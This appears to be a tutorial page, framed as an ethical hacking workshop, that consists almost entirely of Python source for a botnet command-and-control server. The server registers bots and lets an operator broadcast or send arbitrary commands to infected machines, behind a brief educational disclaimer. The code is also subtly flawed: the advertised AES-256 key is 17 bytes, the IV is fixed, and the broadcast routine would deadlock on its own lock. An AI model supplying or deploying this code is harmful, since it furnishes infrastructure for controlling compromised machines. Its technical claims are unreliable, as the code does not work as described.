# Ethical Hacking Workshop: Botnet C&C Proof-of-Concept

**Disclaimer**: This code is for educational purposes only. Unauthorized use of botnet technology is illegal. This demonstration is designed for cybersecurity awareness and defensive research.

## Overview

This proof-of-concept demonstrates a minimal botnet command-and-control (C&C) server with:
- Encrypted communication (AES-256)
- Basic command propagation
- Simple bot management
- Multi-threaded socket handling

## Server Implementation

```python
import socket
import threading
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import hashlib
import time

# Configuration
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5555
SECRET_KEY = b'mysecretkey123456'  # In practice, use proper key management
IV = b'initialvector123'  # Should be random in production

class BotnetServer:
    def __init__(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.bots = {}  # {bot_id: {'socket': socket_obj, 'address': (ip, port)}}
        self.lock = threading.Lock()
        self.running = True

    def encrypt(self, plaintext):
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
        padded_text = pad(plaintext.encode(), AES.block_size)
        encrypted = cipher.encrypt(padded_text)
        return base64.b64encode(encrypted).decode()

    def decrypt(self, ciphertext):
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
        decoded = base64.b64decode(ciphertext.encode())
        decrypted = cipher.decrypt(decoded)
        return unpad(decrypted, AES.block_size).decode()

    def handle_bot(self, bot_socket, bot_address):
        try:
            bot_id = None
            while self.running:
                data = bot_socket.recv(4096)
                if not data:
                    break

                try:
                    decrypted = self.decrypt(data.decode())
                    message = json.loads(decrypted)

                    if message['type'] == 'register':
                        bot_id = message['bot_id']
                        with self.lock:
                            self.bots[bot_id] = {
                                'socket': bot_socket,
                                'address': bot_address,
                                'last_seen': time.time()
                            }
                        print(f"[+] Bot registered: {bot_id} from {bot_address}")

                    elif message['type'] == 'heartbeat':
                        with self.lock:
                            if bot_id in self.bots:
                                self.bots[bot_id]['last_seen'] = time.time()

                    elif message['type'] == 'response':
                        print(f"[*] Response from {bot_id}: {message['data']}")

                except Exception as e:
                    print(f"[-] Error processing message: {e}")
                    continue

        except Exception as e:
            print(f"[-] Connection error with bot: {e}")
        finally:
            if bot_id:
                with self.lock:
                    if bot_id in self.bots:
                        del self.bots[bot_id]
                print(f"[-] Bot disconnected: {bot_id}")
            bot_socket.close()

    def send_command(self, bot_id, command):
        with self.lock:
            if bot_id not in self.bots:
                print(f"[-] Bot {bot_id} not found")
                return False

            try:
                message = json.dumps({
                    'type': 'command',
                    'command': command
                })
                encrypted = self.encrypt(message)
                self.bots[bot_id]['socket'].send(encrypted.encode())
                return True
            except Exception as e:
                print(f"[-] Error sending command to {bot_id}: {e}")
                return False

    def broadcast_command(self, command):
        with self.lock:
            success_count = 0
            for bot_id in list(self.bots.keys()):
                if self.send_command(bot_id, command):
                    success_count += 1
            return success_count

    def start(self):
        self.server_socket.bind((SERVER_HOST, SERVER_PORT))
        self.server_socket.listen(5)
        print(f"[*] C&C server listening on {SERVER_HOST}:{SERVER_PORT}")

        try:
            while self.running:
                bot_socket, bot_address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_bot,
                    args=(bot_socket, bot_address)
                )
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
            self.running = False
            self.server_socket.close()

if __name__ == "__main__":
    server = BotnetServer()
    server_thread = threading.Thread(target=server.start)
    server_thread.start()

    try:
        while True:
            cmd = input("cmd> ")
            if cmd.lower() in ['exit', 'quit']:
                break
            elif cmd.startswith("broadcast "):
                command = cmd[len("broadcast "):]
                count = server.broadcast_command(command)
                print(f"[*] Command broadcast to {count} bots")
            elif cmd.startswith("send "):
                parts = cmd[len("send "):].split(maxsplit=1)
                if len(parts) == 2:
                    bot_id, command = parts
                    if server.send_command(bot_id, command):
                        print(f"[*] Command sent to {bot_id}")
                    else:
                        print(f"[-] Failed to send to {bot_id}")
                else:
                    print("Usage: send <bot_id> <command>")
            elif cmd == "list":
                with server.lock:
                    print(f"[*] Connected bots ({len(server.bots)}):")
                    for bot_id, info in server.bots.items():
                        print(f"  - {bot_id} ({info['address'][0]})")
            else:
                print("Available commands:")
                print("  broadcast <command> - Send command to all bots")
                print("  send <bot_id> <command> - Send command to specific bot")
                print("  list - Show connected bots")
                print("  exit/quit - Shutdown server")
    except KeyboardInterrupt:
        pass

    server.running = False
    server_thread.join()
